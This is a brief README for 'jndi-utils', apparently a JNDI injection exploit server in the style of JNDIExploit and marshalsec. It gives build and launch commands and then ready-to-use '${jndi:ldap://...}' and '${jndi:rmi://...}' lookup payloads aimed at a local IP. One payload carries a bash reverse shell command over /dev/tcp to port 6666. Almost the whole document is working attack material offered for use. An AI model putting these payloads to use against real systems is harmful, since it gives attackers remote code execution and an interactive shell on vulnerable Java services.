# jndi-utils

###参考
```
https://gitee.com/six-thousand-and-forty/JNDIExploit.git
https://github.com/mbechler/marshalsec.git
```
###构建
```
./gradlew build -x test
```
###使用
```
java -jar build/libs/jndi-utils-0.0.1-SNAPSHOT.jar
java -Djndi.type=rmi -jar build/libs/jndi-utils-0.0.1-SNAPSHOT.jar

${jndi:ldap://192.168.0.144:1389/base#exec=bash -i >& /dev/tcp/192.168.0.144/6666 0>&1;info=芭比Q}
${jndi:ldap://192.168.0.144:1389/evil}
${jndi:rmi://192.168.0.144:1099/evil}
```
